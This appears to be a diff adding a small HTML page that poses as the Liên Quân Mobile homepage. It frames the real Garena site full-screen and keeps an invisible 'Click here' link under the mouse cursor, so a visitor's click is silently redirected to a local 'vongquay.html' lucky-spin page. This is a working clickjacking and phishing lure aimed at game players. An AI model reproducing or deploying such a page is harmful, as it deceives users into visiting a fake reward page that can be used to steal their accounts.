@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trang chủ liên quân Moblie | Thắng bại tại kỹ năng</title>
+    <style media="screen">
+        /*body{
+
+        }*/
+        div{
+            color: transparent;
+            border: none;  
+            position: absolute;
+            width: 100 px;
+            height: 100 px;
+        }
+        iframe{
+            border: none;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+        }
+        a{
+            color: white;
+            display: block;
+            width: 100px;
+            height: 100px;
+        }
+     </style>
+</head>
+<body>
+    <iframe src="https://lienquan.garena.vn/" frameborder="0"></iframe>
+    <div class="" id="demo2">
+        <a href="http://127.0.0.1:5500/vongquay.html">Click here</a>
+    </div>
+    <script type="text/javascript">
+        window.onmousemove = function (e){
+            var m = document.getElementById('demo2');
+            m.style.left= e.clientX - 6 + 'px';
+            m.style.top= e.clientY - 6 + 'px';
+        }
+    </script>
+</body>
+</html>
